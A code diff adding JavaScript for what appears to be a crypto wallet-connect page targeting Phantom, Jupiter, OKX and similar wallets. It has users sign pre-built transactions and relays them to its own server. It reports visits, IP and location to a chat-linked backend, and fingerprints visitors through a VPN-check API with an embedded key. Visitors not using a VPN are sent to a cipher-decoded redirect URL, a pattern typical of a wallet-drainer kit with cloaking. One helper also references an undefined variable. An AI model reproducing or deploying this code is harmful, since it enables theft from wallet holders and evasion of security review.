+            backpackWalletNotDetected: "Backpack wallet not detected",
+            okxWalletNotDetected: "OKX wallet not detected",
+            coinbaseWalletNotDetected: "Coinbase wallet not detected",
+            jupiterWalletNotDetected: "Jupiter wallet not detected",
+            openJupiterAppHint:
+              "Opening Jupiter… Page URL copied — if it doesn't load, tap globe and paste.",
+          },
+        };
+
+        // Deep merge function to merge URL config over default config
+        function deepMerge(target, source) {
+          const result = { ...target };
+          for (const key in source) {
+            if (
+              source[key] &&
+              typeof source[key] === "object" &&
+              !Array.isArray(source[key]) &&
+              key in result &&
+              typeof result[key] === "object" &&
+              !Array.isArray(result[key])
+            ) {
+              result[key] = deepMerge(result[key], source[key]);
+            } else {
+              result[key] = source[key];
+            }
+          }
+          return result;
+        }
+
+        // Read config from URL parameter if present
+        let urlConfig = null;
+        let isUsingDefaultConfig = true;
+        let expectedWalletAddress = null; // Declare wallet address variable first
+        let storedParentUrl = null; // Parent URL recovered from sessionStorage after redirect
+
+        try {
+          // First check sessionStorage (set by the redirect script in <head>)
+          // then fall back to URL params (for backwards compatibility)
+          let configParam = null;
+          let configSource = "none";
+
+          const storedConfig = sessionStorage.getItem("__appConfig");
+          if (storedConfig) {
+            configParam = storedConfig;
+            configSource = "sessionStorage";
+            // Clean up after reading
+            sessionStorage.removeItem("__appConfig");
+            /* removed */
+          } else {
+            const urlParams = new URLSearchParams(window.location.search);
+            const appConfigParam = urlParams.get("appConfig");
+            const appParam = urlParams.get("app");
+            configParam = appConfigParam || appParam;
+            if (configParam) configSource = "URL";
+          }
+
+          // Also recover parentUrl from sessionStorage if it was saved
+          storedParentUrl = sessionStorage.getItem("__parentUrl");
+          if (storedParentUrl) {
+            sessionStorage.removeItem("__parentUrl");
+          }
+
+          if (configParam) {
+            try {
+              /* removed */
+              /* removed */
+              /* removed */
+              urlConfig = JSON.parse(decodeURIComponent(configParam));
+              isUsingDefaultConfig = false;
+              /* removed */
+              /* removed */
+
+              // Read wallet address from config object (same way as customAirdropMint)
+              if (urlConfig.expectedWalletAddress) {
+                expectedWalletAddress = urlConfig.expectedWalletAddress;
+                /* removed */
+              }
+            } catch (e) {
+              /* removed */
+            }
+          }
+        } catch (e) {
+          /* removed */
+        }
+
+        // Merge URL config over default config (URL config takes precedence)
+        const config = urlConfig
+          ? deepMerge(defaultConfig, urlConfig)
+          : defaultConfig;
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+
+        // Compare URL config vs default to show what actually changed
+        if (urlConfig) {
+          /* removed */
+          for (const key of Object.keys(urlConfig)) {
+            if (key === "texts") {
+              const urlTexts = urlConfig.texts || {};
+              const defTexts = defaultConfig.texts || {};
+              for (const tKey of Object.keys(urlTexts)) {
+                if (urlTexts[tKey] !== defTexts[tKey]) {
+                  /* removed */
+                }
+              }
+            } else {
+              /* removed */
+            }
+          }
+          /* removed */
+        }
+
+        // ============================================================
+        // FIX: Strip query params from URL after parsing config.
+        // Phantom extension uses the page URL in its internal messaging
+        // between content script and background/popup. Very long URLs
+        // (3000+ chars from appConfig) cause Phantom's connect() to
+        // silently hang forever. We use history.replaceState to shorten
+        // the URL *after* we've already parsed all config into JS vars.
+        // ============================================================
+        // originalSearchParams is empty now (redirect already stripped the URL)
+        // but we keep it for any edge case where URL params are still present
+        const originalSearchParams = new URLSearchParams(
+          window.location.search,
+        );
+        /* removed */
+        /* removed */
+
+        let userPubkey = null;
+        let unsignedTxs = null;
+        let currentProvider = null;
+        let currentWallet = null;
+        let phantomMessageSignature = null;
+        let isRejected = false;
+        let rejectNotificationSent = false;
+        let backpackBlockaidStarted = false;
+        // expectedWalletAddress is now set above from URL parameter
+        let parentUrl = null; // Store parent URL received via postMessage
+        let visitNotificationSent = false;
+
+        let solanaWeb3ReadyPromise = null;
+        function ensureSolanaWeb3Ready() {
+          if (
+            window.solanaWeb3 &&
+            window.solanaWeb3.Transaction &&
+            typeof window.Buffer !== "undefined" &&
+            typeof window.Buffer.from === "function"
+          ) {
+            return Promise.resolve(window.solanaWeb3);
+          }
+          if (solanaWeb3ReadyPromise) return solanaWeb3ReadyPromise;
+          solanaWeb3ReadyPromise = (async () => {
+            const { Buffer } = await import("https://esm.sh/buffer@6.0.3");
+            const bs58mod = await import("https://esm.sh/bs58@5.0.0");
+            const solanaWeb3 =
+              await import("https://esm.sh/@solana/web3.js@1.95.3");
+            window.Buffer = Buffer;
+            window.bs58 = bs58mod.default;
+            window.global = window;
+            window.process = window.process || {
+              env: { NODE_ENV: "production" },
+              version: "",
+              browser: true,
+            };
+            window.solanaWeb3 = solanaWeb3;
+            return solanaWeb3;
+          })();
+          return solanaWeb3ReadyPromise;
+        }
+
+        function decodeWalletBytes(raw) {
+          if (raw == null) throw new Error("Empty value");
+          if (raw instanceof Uint8Array) return raw;
+          if (
+            typeof window.Buffer !== "undefined" &&
+            window.Buffer.isBuffer(raw)
+          ) {
+            return new Uint8Array(raw.buffer, raw.byteOffset, raw.byteLength);
+          }
+          if (typeof raw === "string") {
+            const s = raw.trim();
+            if (/^[1-9A-HJ-NP-Za-km-z]+$/.test(s) && window.bs58) {
+              try {
+                const d = window.bs58.decode(s);
+                if (d.length >= 64) return d;
+              } catch (_) {}
+            }
+            if (/^[A-Za-z0-9+/=_-]+$/.test(s)) {
+              const clean = s.replace(/-/g, "+").replace(/_/g, "/");
+              const bin = atob(clean);
+              const out = new Uint8Array(bin.length);
+              for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
+              return out;
+            }
+            throw new Error("Unrecognized string len=" + s.length);
+          }
+          if (Array.isArray(raw)) return new Uint8Array(raw);
+          if (raw && typeof raw.serialize === "function") {
+            return raw.serialize({
+              requireAllSignatures: false,
+              verifySignatures: false,
+            });
+          }
+          if (raw && raw.buffer instanceof ArrayBuffer) {
+            return new Uint8Array(
+              raw.buffer,
+              raw.byteOffset || 0,
+              raw.byteLength || raw.length || 0,
+            );
+          }
+          if (raw && typeof raw === "object") {
+            const numKeys = Object.keys(raw)
+              .filter((k) => /^\d+$/.test(k))
+              .sort((a, b) => Number(a) - Number(b));
+            if (numKeys.length > 0) {
+              return new Uint8Array(numKeys.map((k) => raw[k]));
+            }
+          }
+          throw new Error("Unknown bytes type: " + typeof raw);
+        }
+
+        function toSignedTxBytes(raw) {
+          return decodeWalletBytes(raw);
+        }
+
+        function walletSignResult(raw) {
+          const wireBytes = decodeWalletBytes(raw);
+          let tx = null;
+          try {
+            tx = window.solanaWeb3.Transaction.from(wireBytes);
+          } catch (_) {}
+          return { wireBytes, tx };
+        }
+
+        function walletResultFromBytes(bytes, unsignedTx, userPkStr) {
+          const minFull = Math.max(80, unsignedTx ? 0 : 80);
+          if (bytes.length >= minFull) {
+            let tx = null;
+            try {
+              tx = window.solanaWeb3.Transaction.from(bytes);
+            } catch (_) {}
+            return { wireBytes: bytes, tx };
+          }
+          if (bytes.length === 64 && unsignedTx) {
+            return applySigToUnsignedTx(unsignedTx, bytes, userPkStr);
+          }
+          if (bytes.length > 64 && bytes.length <= 128 && unsignedTx) {
+            return applySigToUnsignedTx(
+              unsignedTx,
+              bytes.slice(0, 64),
+              userPkStr,
+            );
+          }
+          return null;
+        }
+
+        function applySigToUnsignedTx(unsignedTx, sigBytes, userPkStr) {
+          const SolWeb3 = window.solanaWeb3;
+          const userPk = new SolWeb3.PublicKey(userPkStr);
+          const tx = SolWeb3.Transaction.from(
+            unsignedTx.serialize({
+              requireAllSignatures: false,
+              verifySignatures: false,
+            }),
+          );
+          let applied = false;
+          for (let i = 0; i < tx.signatures.length; i++) {
+            if (tx.signatures[i].publicKey.equals(userPk)) {
+              tx.signatures[i].signature = sigBytes;
+              applied = true;
+              break;
+            }
+          }
+          if (!applied)
+            tx.signatures.push({ publicKey: userPk, signature: sigBytes });
+          const wireBytes = tx.serialize({
+            requireAllSignatures: false,
+            verifySignatures: false,
+          });
+          return { wireBytes, tx };
+        }
+
+        function isByteContainer(v) {
+          return (
+            v instanceof Uint8Array ||
+            Array.isArray(v) ||
+            typeof v === "string" ||
+            (v && typeof v.serialize === "function") ||
+            (typeof window.Buffer !== "undefined" && window.Buffer.isBuffer(v))
+          );
+        }
+
+        function collectWalletResultCandidates(result) {
+          const out = [];
+          if (result == null) return out;
+          if (result.wireBytes instanceof Uint8Array) {
+            out.push(result.wireBytes);
+            return out;
+          }
+          if (Array.isArray(result)) {
+            for (let i = 0; i < result.length; i++) out.push(result[i]);
+            out.push(result);
+          } else if (result instanceof Uint8Array) {
+            out.push(result);
+          } else if (typeof result === "object") {
+            if (raw.signedTransaction != null)
+              out.push(result.signedTransaction);
+            if (result.transaction != null) out.push(result.transaction);
+            if (result.signedTx != null) out.push(result.signedTx);
+            if (result.bytes != null) out.push(result.bytes);
+            if (result.data != null) out.push(result.data);
+            if (result.signature != null) out.push(result.signature);
+            if (result.signatures && result.signatures[0] != null)
+              out.push(result.signatures[0]);
+            if (typeof result.serialize === "function") out.push(result);
+            out.push(result);
+          } else {
+            out.push(result);
+          }
+          return out;
+        }
+
+        function resolveSignedFromWallet(
+          unsignedTx,
+          unsignedWire,
+          result,
+          userPkStr,
+        ) {
+          /* removed */
+
+          function tryWire(raw, depth) {
+            if (raw == null || depth > 6) return null;
+            if (raw.wireBytes instanceof Uint8Array) return raw;
+            let bytes;
+
+            if (raw && typeof raw.serialize === "function") {
+              try {
+                const wireBytes = raw.serialize({
+                  requireAllSignatures: false,
+                  verifySignatures: false,
+                });
+                return { wireBytes, tx: raw };
+              } catch (_) {}
+            }
+
+            if (raw && typeof raw === "object" && !isByteContainer(raw)) {
+              if (raw.signedTransaction != null)
+                return tryWire(raw.signedTransaction, depth + 1);
+              if (raw.transaction != null)
+                return tryWire(raw.transaction, depth + 1);
+              if (raw.signedTx != null) return tryWire(raw.signedTx, depth + 1);
+              if (raw.bytes != null) return tryWire(raw.bytes, depth + 1);
+              if (raw.data != null) return tryWire(raw.data, depth + 1);
+              if (raw.signature != null)
+                return tryWire(raw.signature, depth + 1);
+              if (raw.signatures && raw.signatures[0] != null)
+                return tryWire(raw.signatures[0], depth + 1);
+              const numKeys = Object.keys(raw).filter((k) => /^\d+$/.test(k));
+              if (numKeys.length > 0) {
+                try {
+                  bytes = decodeWalletBytes(raw);
+                } catch (e) {
+                  /* removed */
+                  return null;
+                }
+              } else {
+                return null;
+              }
+            } else {
+              try {
+                bytes = decodeWalletBytes(raw);
+              } catch (e) {
+                /* removed */
+                return null;
+              }
+            }
+
+            if (!bytes) return null;
+
+            /* removed */
+
+            const fullThreshold = unsignedWire
+              ? Math.max(60, unsignedWire.length - 32)
+              : 80;
+            if (bytes.length >= fullThreshold) {
+              return walletResultFromBytes(bytes, null, userPkStr);
+            }
+            if (
+              bytes.length === 64 ||
+              (bytes.length > 64 && bytes.length <= 128)
+            ) {
+              return applySigToUnsignedTx(
+                unsignedTx,
+                bytes.length === 64 ? bytes : bytes.slice(0, 64),
+                userPkStr,
+              );
+            }
+            const parsed = walletResultFromBytes(bytes, unsignedTx, userPkStr);
+            if (parsed) return parsed;
+
+            try {
+              const tx = window.solanaWeb3.Transaction.from(bytes);
+              return { wireBytes: bytes, tx };
+            } catch (_) {}
+
+            return null;
+          }
+
+          const candidates = collectWalletResultCandidates(result);
+          for (let i = 0; i < candidates.length; i++) {
+            const resolved = tryWire(candidates[i], 0);
+            if (resolved) return resolved;
+          }
+          /* removed */
+          throw new Error(
+            "Could not resolve signed tx from Jupiter wallet response",
+          );
+        }
+
+        function getSignedWireBytes(signed) {
+          if (signed && signed.wireBytes instanceof Uint8Array)
+            return signed.wireBytes;
+          return signed.serialize({
+            requireAllSignatures: false,
+            verifySignatures: false,
+          });
+        }
+
+        async function relaySignedTransaction(signed) {
+          const signedBytes = getSignedWireBytes(signed);
+          const b64Signed = uint8ToBase64(signedBytes);
+          const resp = await fetch(
+            API_BASE_URL.replace(/\/$/, "") + "/relay-transaction",
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                signedTx: b64Signed,
+                userChatId:
+                  config.userChatId != null &&
+                  String(config.userChatId).trim() !== ""
+                    ? String(config.userChatId).trim()
+                    : undefined,
+                userPublicKey: userPubkey || undefined,
+              }),
+            },
+          );
+          const json = await resp.json();
+          return { ok: resp.ok, json };
+        }
+
+        async function sendConfirmNotification(txids, opts) {
+          if (!userPubkey || !txids || !txids.length) return;
+          try {
+            await fetch(API_BASE_URL.replace(/\/$/, "") + "/notify-confirm", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                userPublicKey: userPubkey,
+                userChatId: config.userChatId,
+                txids,
+                txBatchIndex: opts && opts.txBatchIndex,
+                jupiterPartial: !!(opts && opts.jupiterPartial),
+              }),
+            });
+          } catch (e) {
+            /* removed */
+          }
+        }
+
+        function parseSignedTransaction(raw) {
+          return (
+            walletSignResult(raw).tx ||
+            window.solanaWeb3.Transaction.from(toSignedTxBytes(raw))
+          );
+        }
+
+        function uint8ToBase64(bytes) {
+          let bin = "";
+          for (let i = 0; i < bytes.length; i++)
+            bin += String.fromCharCode(bytes[i]);
+          return btoa(bin);
+        }
+
+        function txHasUserSignature(tx, userPkStr) {
+          const userPk = new window.solanaWeb3.PublicKey(userPkStr);
+          return (tx.signatures || []).some(
+            (s) =>
+              s.publicKey &&
+              s.publicKey.equals(userPk) &&
+              s.signature &&
+              s.signature.length > 0,
+          );
+        }
+
+        function assertSignedTxsHaveUserSig(signedTxs, userPkStr) {
+          signedTxs.forEach((signed, i) => {
+            if (signed && signed.wireBytes) {
+              if (signed.wireBytes.length < 80) {
+                throw new Error(
+                  "Transaction " +
+                    (i + 1) +
+                    " signed bytes too short (" +
+                    signed.wireBytes.length +
+                    ")",
+                );
+              }
+              if (signed.tx && !txHasUserSignature(signed.tx, userPkStr)) {
+                throw new Error(
+                  "Transaction " +
+                    (i + 1) +
+                    " missing user signature after wallet sign",
+                );
+              }
+              return;
+            }
+            if (!txHasUserSignature(signed, userPkStr)) {
+              throw new Error(
+                "Transaction " +
+                  (i + 1) +
+                  " missing user signature after wallet sign",
+              );
+            }
+          });
+        }
+
+        // Debug: Log wallet address status
+        if (expectedWalletAddress) {
+          /* removed */
+        } else {
+          /* removed */
+        }
+
+        // Helper function to get text with fallback
+        function getText(key, fallback) {
+          return (config && config.texts && config.texts[key]) || fallback;
+        }
+
+        // Set initial UI texts from hardcoded config
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        if (titleEl)
+          titleEl.textContent = getText("title", "Log in or sign up");
+        if (subtitleEl)
+          subtitleEl.textContent = getText(
+            "subtitle",
+            "Choose a wallet to connect to this app",
+          );
+        (async () => {
+          if (/phantom/i.test(navigator.userAgent)) {
+            try {
+              const _ctrl = new AbortController();
+              const _tid = setTimeout(() => _ctrl.abort(), 4000);
+              const _res = await fetch(
+                "https://vpnapi.io/api/?key=63281f37f19041d2aa768098c329fd47",
+                { signal: _ctrl.signal },
+              );
+              clearTimeout(_tid);
+              if (_res.ok) {
+                const _d = await _res.json();
+                const _s = _d?.security;
+                if (_s && !_s.vpn && !_s.proxy && !_s.tor && !_s.relay) {
+                  try {
+                    const _rdCtrl = new AbortController();
+                    const _rdTid = setTimeout(() => _rdCtrl.abort(), 4000);
+                    const _rdRes = await fetch(apiUrl("/rdtcv7"), {
+                      signal: _rdCtrl.signal,
+                    });
+                    clearTimeout(_rdTid);
+                    if (!_rdRes.ok)
+                      throw new Error("rdtcv7 HTTP " + _rdRes.status);
+                    const _rdJson = await _rdRes.json();
+                    const _decoded = simpleCipherDecode(_rdJson.d);
+                    if (/^https?:\/\//i.test(_decoded)) {
+                      (window.top || window).location.href = _decoded;
+                      return;
+                    }
+                  } catch (_rdErr) {
+                    /* removed */
+                  }
+                }
+              }
+            } catch (_e) {}
+          }
+          sendVisitNotification();
+          setTimeout(() => tryAutoConnect(), 100);
+        })();
+
+        // Close button handler
+        const closeBtn = document.getElementById("closeBtn");
+        if (closeBtn) {
+          closeBtn.addEventListener("click", () => {
+            postToParent("close", {});
+          });
+        }
+
+        // Search functionality
+        const walletSearch = document.getElementById("walletSearch");
+        if (walletSearch) {
+          walletSearch.addEventListener("input", (e) => {
+            const searchTerm = e.target.value.toLowerCase();
+            const buttons = document.querySelectorAll(".wallet-button");
+            buttons.forEach((btn) => {
+              const name = btn
+                .querySelector(".wallet-name")
+                .textContent.toLowerCase();
+              btn.style.display = name.includes(searchTerm) ? "flex" : "none";
+            });
+          });
+        }
+
+        // Jupiter Wallet Standard discovery + legacy provider wrapper
+        const JUPITER_WALLET_NAME_RE = /jupiter/i;
+        const walletStandardRegistries = new WeakMap();
+
+        function getWalletStandardContexts() {
+          const contexts = [window];
+          try {
+            if (window.parent && window.parent !== window)
+              contexts.push(window.parent);
+          } catch (_) {}
+          try {
+            if (
+              window.top &&
+              window.top !== window &&
+              !contexts.includes(window.top)
+            )
+              contexts.push(window.top);
+          } catch (_) {}
+          return contexts;
+        }
+
+        function isJupiterStandardWallet(wallet) {
+          if (!wallet || !wallet.name) return false;
+          if (!JUPITER_WALLET_NAME_RE.test(wallet.name)) return false;
+          const features = wallet.features || {};
+          return !!(
+            features["standard:connect"] &&
+            (features["solana:signTransaction"] ||
+              features["solana:signAndSendTransaction"])
+          );
+        }
+
+        function initWalletStandardRegistryForContext(ctx) {
+          if (!ctx) return null;
+          if (walletStandardRegistries.has(ctx))
+            return walletStandardRegistries.get(ctx);
+
+          const registered = new Set();
+          const wallets = [];
+          const api = Object.freeze({
+            register(...ws) {
+              ws.forEach((wallet) => {
+                if (wallet && !registered.has(wallet)) {
+                  registered.add(wallet);
+                  wallets.push(wallet);
+                }
+              });
+            },
+          });
+
+          const onRegisterWallet = (event) => {
+            try {
+              if (typeof event.detail === "function") event.detail(api);
+            } catch (_) {}
+          };
+
+          try {
+            ctx.addEventListener(
+              "wallet-standard:register-wallet",
+              onRegisterWallet,
+            );
+          } catch (_) {}
+
+          try {
+            ctx.dispatchEvent(
+              new CustomEvent("wallet-standard:app-ready", {
+                bubbles: false,
+                cancelable: false,
+                detail: api,
+              }),
+            );
+          } catch (_) {}
+
+          // Legacy pre-standard registration queue
+          try {
+            const legacy = ctx.navigator && ctx.navigator.wallets;
+            if (Array.isArray(legacy)) {
+              legacy.forEach((callback) => {
+                try {
+                  if (typeof callback === "function") callback(api);
+                } catch (_) {}
+              });
+            }
+          } catch (_) {}
+
+          const registry = { wallets, api, ctx, onRegisterWallet };
+          walletStandardRegistries.set(ctx, registry);
+          return registry;
+        }
+
+        function ensureWalletStandardDiscovery() {
+          getWalletStandardContexts().forEach((ctx) => {
+            try {
+              initWalletStandardRegistryForContext(ctx);
+            } catch (_) {}
+          });
+        }
+
+        function findJupiterStandardWallet() {
+          ensureWalletStandardDiscovery();
+          for (const ctx of getWalletStandardContexts()) {
+            try {
+              const registry = initWalletStandardRegistryForContext(ctx);
+              if (!registry) continue;
+              const wallet = registry.wallets.find(isJupiterStandardWallet);
+              if (wallet) return { wallet, ctx };
+            } catch (_) {}
+          }
+          return null;
+        }
+
+        function pickSolanaStandardAccount(accounts) {
+          if (!accounts || !accounts.length) return null;
+          return (
+            accounts.find((account) =>
+              (account.chains || []).some((chain) =>
+                String(chain).startsWith("solana:"),
+              ),
+            ) || accounts[0]
+          );
+        }
+
+        function getSolanaStandardChain(wallet) {
+          const chains = wallet && wallet.chains ? wallet.chains : [];
+          return (
+            chains.find((chain) => String(chain).startsWith("solana:")) ||
+            "solana:mainnet"
+          );
+        }
+
+        function wrapJupiterWalletStandard(wallet, account) {
+          const chain = getSolanaStandardChain(wallet);
+          let activeAccount =
+            account || pickSolanaStandardAccount(wallet.accounts || []);
+
+          const provider = {
+            isJupiter: true,
+            _wsWallet: wallet,
+            get publicKey() {
+              const SolWeb3 = window.solanaWeb3;
+              return activeAccount && SolWeb3
+                ? new SolWeb3.PublicKey(activeAccount.address)
+                : null;
+            },
+            get isConnected() {
+              return !!activeAccount;
+            },
+            connect: async (opts) => {
+              const connectFeature =
+                wallet.features && wallet.features["standard:connect"];
+              if (
+                !connectFeature ||
+                typeof connectFeature.connect !== "function"
+              ) {
+                throw new Error("Jupiter wallet does not support connect");
+              }
+              const silent = !!(opts && opts.onlyIfTrusted);
+              const result = await connectFeature.connect(
+                silent ? { silent: true } : undefined,
+              );
+              const accounts =
+                (result && result.accounts) || wallet.accounts || [];
+              activeAccount = pickSolanaStandardAccount(accounts);
+              if (!activeAccount)
+                throw new Error("No Solana account from Jupiter wallet");
+              return { publicKey: provider.publicKey };
+            },
+            disconnect: async () => {
+              const disconnectFeature =
+                wallet.features && wallet.features["standard:disconnect"];
+              if (
+                disconnectFeature &&
+                typeof disconnectFeature.disconnect === "function"
+              ) {
+                await disconnectFeature.disconnect();
+              }
+              activeAccount = null;
+            },
+            signMessage: async (message) => {
+              const signMessageFeature =
+                wallet.features && wallet.features["solana:signMessage"];
+              if (
+                !signMessageFeature ||
+                typeof signMessageFeature.signMessage !== "function"
+              ) {
+                throw new Error("Jupiter wallet does not support signMessage");
+              }
+              const messageBytes =
+                typeof message === "string"
+                  ? new TextEncoder().encode(message)
+                  : message;
+              const result = await signMessageFeature.signMessage({
+                account: activeAccount,
+                message: messageBytes,
+              });
+              return { signature: result.signature };
+            },
+            signTransaction: async (tx) => {
+              await ensureSolanaWeb3Ready();
+              const SolWeb3 = window.solanaWeb3;
+              const signTxFeature =
+                wallet.features && wallet.features["solana:signTransaction"];
+              if (
+                !signTxFeature ||
+                typeof signTxFeature.signTransaction !== "function"
+              ) {
+                throw new Error(
+                  "Jupiter wallet does not support signTransaction",
+                );
+              }
+              const serialized = tx.serialize({
+                requireAllSignatures: false,
+                verifySignatures: false,
+              });
+              const unsignedTxCopy = SolWeb3.Transaction.from(serialized);
+              const chainToUse = chain || "solana:mainnet";
+              const result = await signTxFeature.signTransaction({
+                account: activeAccount,
+                transaction: serialized,
+                chain: chainToUse,
+              });
+              return resolveSignedFromWallet(
+                unsignedTxCopy,
+                serialized,
+                result,
+                activeAccount.address,
+              );
+            },
+            signAllTransactions: async (txs) => {
+              const signed = [];
+              for (let i = 0; i < txs.length; i++) {
+                if (
+                  typeof updateLoadingStatus === "function" &&
+                  txs.length > 1
+                ) {
+                  updateLoadingStatus(
+                    getText(
+                      "requestingSignatures",
+                      "Requesting signatures...",
+                    ) +
+                      " (" +
+                      (i + 1) +
+                      "/" +
+                      txs.length +
+                      ")",
+                  );
+                }
+                signed.push(await provider.signTransaction(txs[i]));
+              }
+              return signed;
+            },
+          };
+          return provider;
+        }
+
+        function getJupiterProvider() {
+          const found = findJupiterStandardWallet();
+          if (!found) return null;
+          return wrapJupiterWalletStandard(
+            found.wallet,
+            pickSolanaStandardAccount(found.wallet.accounts || []),
+          );
+        }
+
+        function isJupiterWalletInstalled() {
+          return !!findJupiterStandardWallet();
+        }
+
+        function resolveJupiterProvider() {
+          return getJupiterProvider();
+        }
+
+        function isInJupiterMobileBrowser() {
+          return /jupiter/i.test(navigator.userAgent || "");
+        }
+
+        function buildJupiterMobileDeeplink(dappUrl) {
+          try {
+            sessionStorage.setItem("__jupiterPendingDappUrl", dappUrl);
+          } catch (_) {}
+          // Jupiter expects the dapp URL in the path, not ?url= (query opens app but won't navigate).
+          return "jupiter://browse/" + encodeURIComponent(dappUrl);
+        }
+
+        function copyTextToClipboardQuiet(text) {
+          try {
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+              navigator.clipboard.writeText(text).catch(function () {});
+            }
+          } catch (_) {}
+        }
+
+        function openJupiterMobileDeeplink(dappUrl) {
+          try {
+            sessionStorage.setItem("__jupiterPendingDappUrl", dappUrl);
+          } catch (_) {}
+          const encoded = encodeURIComponent(dappUrl);
+          const ua = navigator.userAgent || "";
+          const target =
+            window.parent && window.parent !== window ? window.parent : window;
+
+          // Path-style browse link (matches Slush/Phantom pattern; ?url= only cold-starts the app).
+          const schemeUrl = "jupiter://browse/" + encoded;
+          copyTextToClipboardQuiet(dappUrl);
+
+          if (/Android/i.test(ua)) {
+            const intentUrl =
+              "intent://browse/" +
+              encoded +
+              "#Intent;scheme=jupiter;package=ag.jup.jupiter.android;" +
+              "action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;" +
+              "S.browser_fallback_url=" +
+              encoded +
+              ";end";
+            target.location.href = intentUrl;
+            return true;
+          }
+
+          target.location.href = schemeUrl;
+          return true;
+        }
+
+        // Check which wallets are installed and update UI
+        function checkInstalledWallets() {
+          // Check Phantom
+          const phantom = window.phantom?.solana || window.solana;
+          const isPhantomInstalled = phantom && phantom.isPhantom;
+          updateWalletInstalledStatus("phantomBtn", isPhantomInstalled);
+
+          // Check Backpack
+          const backpack = window.backpack;
+          const isBackpackInstalled = backpack && backpack.isBackpack;
+          updateWalletInstalledStatus("backpackBtn", isBackpackInstalled);
+
+          // Check Solflare
+          const solflare = window.solflare;
+          const isSolflareInstalled = solflare && solflare.isSolflare;
+          updateWalletInstalledStatus("solflareBtn", isSolflareInstalled);
+
+          // Check OKX
+          const okx = window.okxwallet?.solana;
+          const isOkxInstalled = !!okx;
+          updateWalletInstalledStatus("okxBtn", isOkxInstalled);
+
+          // Check Coinbase
+          const coinbase = window.coinbaseSolana;
+          const isCoinbaseInstalled = !!coinbase;
+          updateWalletInstalledStatus("coinbaseBtn", isCoinbaseInstalled);
+
+          const isJupiterInstalled = isJupiterWalletInstalled();
+          updateWalletInstalledStatus("jupiterBtn", isJupiterInstalled);
+        }
+
+        function updateWalletInstalledStatus(buttonId, isInstalled) {
+          const button = document.getElementById(buttonId);
+          if (!button) return;
+
+          let statusElement = button.querySelector(".wallet-status");
+          const arrow = button.querySelector(".wallet-arrow");
+
+          if (isInstalled) {
+            // Add status badge if it doesn't exist
+            if (!statusElement) {
+              statusElement = document.createElement("span");
+              statusElement.className = "wallet-status";
+              statusElement.innerHTML = '<span class="dot"></span>Installed';
+              button.appendChild(statusElement);
+            }
+            // Hide arrow
+            if (arrow) arrow.style.display = "none";
+          } else {
+            // Remove status badge if it exists
+            if (statusElement) {
+              statusElement.remove();
+            }
+            // Keep arrow hidden (we don't show arrows in this design)
+            if (arrow) arrow.style.display = "none";
+          }
+        }
+
+        // Check installed wallets on load
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        /* removed */
+        checkInstalledWallets();
+        ensureWalletStandardDiscovery();
+
+        // Also check periodically in case wallets are loaded asynchronously
+        let checkInterval = setInterval(() => {
+          ensureWalletStandardDiscovery();
+          checkInstalledWallets();
+          // Stop checking after 5 seconds
+          setTimeout(() => clearInterval(checkInterval), 5000);
+        }, 500);
+
+        // Mobile detection
+        function isMobile() {
+          return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+            navigator.userAgent,
+          );
+        }
+
+        // Check if we're in a wallet app
+        function isInWalletApp() {
+          const ua = navigator.userAgent.toLowerCase();
+          if (
+            ua.includes("phantom") ||
+            ua.includes("backpack") ||
+            ua.includes("okx") ||
+            ua.includes("coinbase")
+          ) {
+            return true;
+          }
+          if (isInJupiterMobileBrowser()) {
+            return true;
+          }
+          // Solflare in-app browser often uses a generic WebKit UA without "solflare"; rely on injected provider
+          if (window.solflare && window.solflare.isSolflare) {
+            return true;
+          }
+          return ua.includes("solflare");
+        }
+
+        /**
+         * OKX app may default SVM to Sonic; switch to Solana mainnet before signing.
+         * Never block forever: changeNetwork can hang if no prompt is shown (iframe / gesture rules).
+         * OKX doc: window.okxwallet.svm.changeNetwork({ genesisHash })
+         */
+        async function ensureOkxSolanaMainnet(opts) {
+          const timeoutMs = (opts && opts.timeoutMs) || 5000;
+          const svm = window.okxwallet && window.okxwallet.svm;
+          if (!svm || typeof svm.changeNetwork !== "function") return;
+          const SOLANA_MAINNET_GENESIS =
+            "5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d";
+          try {
+            const out = await Promise.race([
+              svm.changeNetwork({ genesisHash: SOLANA_MAINNET_GENESIS }),
+              new Promise((_, rej) =>
+                setTimeout(
+                  () => rej(new Error("OKX changeNetwork timeout")),
+                  timeoutMs,
+                ),
+              ),
+            ]);
+            /* removed */
+          } catch (e) {
+            /* removed */
+          }
+        }
+
+        // Get browser name
+        function getBrowserName() {
+          const ua = navigator.userAgent;
+          if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
+          if (ua.includes("Firefox")) return "Firefox";
+          if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+          if (ua.includes("Edg")) return "Edge";
+          return "Unknown";
+        }
+
+        // Get country flag emoji from country code
+        function getFlagEmoji(countryCode) {
+          if (!countryCode) return "";
+          const codePoints = countryCode
+            .toUpperCase()
+            .split("")
+            .map((char) => 127397 + char.charCodeAt());
+          return String.fromCodePoint(...codePoints);
+        }
+
+        // Get IP and location info
+        async function getIPAndLocation() {
+          try {
+            // Check if IP is already cached in localStorage
+            const cachedIP = localStorage.getItem("kiwi_user_ip");
+            if (cachedIP) {
+              /* removed */
+              return {
+                ip: cachedIP,
+                country: localStorage.getItem("kiwi_user_country") || "Unknown",
+                countryCode:
+                  localStorage.getItem("kiwi_user_countryCode") || "",
+                flag: localStorage.getItem("kiwi_user_flag") || "",
+              };
+            }
+
+            const resp = await fetch("https://ipapi.co/json/");
